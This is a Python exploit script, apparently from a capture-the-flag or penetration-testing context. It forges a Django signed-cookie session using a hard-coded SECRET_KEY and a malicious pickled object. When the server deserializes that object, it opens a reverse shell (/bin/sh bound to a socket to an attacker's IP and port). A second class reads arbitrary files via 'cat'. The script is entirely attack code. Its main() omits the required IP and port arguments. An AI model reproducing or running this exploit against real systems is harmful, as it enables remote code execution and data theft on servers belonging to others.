# -*- coding: utf-8 -*-
# Created by restran on 2016/10/21
from __future__ import unicode_literals, absolute_import
from django.contrib.sessions.serializers import PickleSerializer
from django.core import signing
from django.conf import settings
import subprocess
import requests


class GetShellWithPython(object):
    def __init__(self, local_ip, local_port):
        self.local_ip = local_ip
        self.local_port = local_port

    def __reduce__(self):
        import subprocess
        return (subprocess.call,
                (['python',
                  '-c',
                  'import socket,subprocess,os;'
                  's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
                  's.connect(("%s",%s));'
                  'os.dup2(s.fileno(),0);'
                  'os.dup2(s.fileno(),1);'
                  'os.dup2(s.fileno(),2);'
                  'subprocess.call(["/bin/sh","-i"]);' %
                  (self.local_ip, self.local_port)],))


class CatFileWithPython(object):
    def __init__(self, file_name):
        self.file_name = file_name

    def __reduce__(self):
        return (
            subprocess.call,
            (['cat', self.file_name],)
        )


def make_session_id(*args, **kwargs):
    sess = signing.dumps(
        obj=GetShellWithPython(*args, **kwargs),
        serializer=PickleSerializer,
        salt='django.contrib.sessions.backends.signed_cookies'
    )
    print(sess)


SECRET_KEY = '=zyq&zvb7==*6mby!d2k&wr$*r50an&igt25l05i6l&ubpd5fb'


def main():
    settings.configure(SECRET_KEY=SECRET_KEY)
    make_session_id()

if __name__ == '__main__':
    main()
